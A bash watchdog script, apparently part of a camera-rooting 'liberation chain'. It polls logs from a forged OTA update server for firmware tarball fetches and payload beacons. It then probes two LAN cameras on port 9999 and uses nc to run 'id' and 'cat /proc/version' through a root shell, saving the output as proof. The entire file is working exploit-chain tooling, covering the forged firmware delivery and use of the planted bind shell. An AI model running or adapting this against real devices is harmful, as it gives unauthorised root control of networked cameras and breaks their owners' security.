#!/bin/bash
# Liberation chain watchdog v2: beacon/backup/tar detection + telnetd auto-probe
B0=$(grep -c BEACON /tmp/fss_beacons.log 2>/dev/null || echo 0)
T0=$(grep -ac 'GET.*4.52.17.32.tar' /tmp/ota/forge.log 2>/dev/null || echo 0)
while true; do
  B=$(grep -c BEACON /tmp/fss_beacons.log 2>/dev/null || echo 0)
  SZ=$(du -sk /tmp/fwbackup 2>/dev/null | cut -f1)
  TAR=$(grep -ac 'GET.*4.52.17.32.tar' /tmp/ota/forge.log 2>/dev/null || echo 0)
  D5=$(grep -ac 'GET.*50199' /tmp/ota/forge.log 2>/dev/null || echo 0)
  echo "$(date '+%H:%M:%S') beacons=$B backupKB=${SZ:-0} tar=$TAR(Δ$((TAR-T0))) fetch50199=$D5"
  if [ "$B" -gt "$B0" ]; then
    echo "$(date '+%H:%M:%S') *** NEW BEACON — payload executed ***"
    grep BEACON /tmp/fss_beacons.log | tail -1
    for cam in 39 51; do
      if timeout 4 bash -c "exec 3<>/dev/tcp/192.168.4.$cam/9999" 2>/dev/null; then
        echo "$(date '+%H:%M:%S') *** ROOT SHELL on .$cam:9999 — capturing id ***"
        (printf 'id > /tmp/root_proof.txt; cat /proc/version >> /tmp/root_proof.txt\n'; sleep 2) | timeout 8 nc 192.168.4.$cam 9999 > /tmp/pane1/192.168.4.$cam/root_via_9999.txt 2>/dev/null
        echo "$(date '+%H:%M:%S') proof bytes: $(wc -c < /tmp/pane1/192.168.4.$cam/root_via_9999.txt 2>/dev/null)"
      fi
    done
    B0=$B
  fi
  [ "$TAR" -gt "$T0" ] && { echo "$(date '+%H:%M:%S') *** CAPSULE FETCHED (0x1fe fired — OTA install starting) ***"; T0=$TAR; }
  [ "${SZ:-0}" -gt 100 ] && echo "$(date '+%H:%M:%S') *** BACKUPS ARRIVING — flash imminent ***"
  sleep 60
done
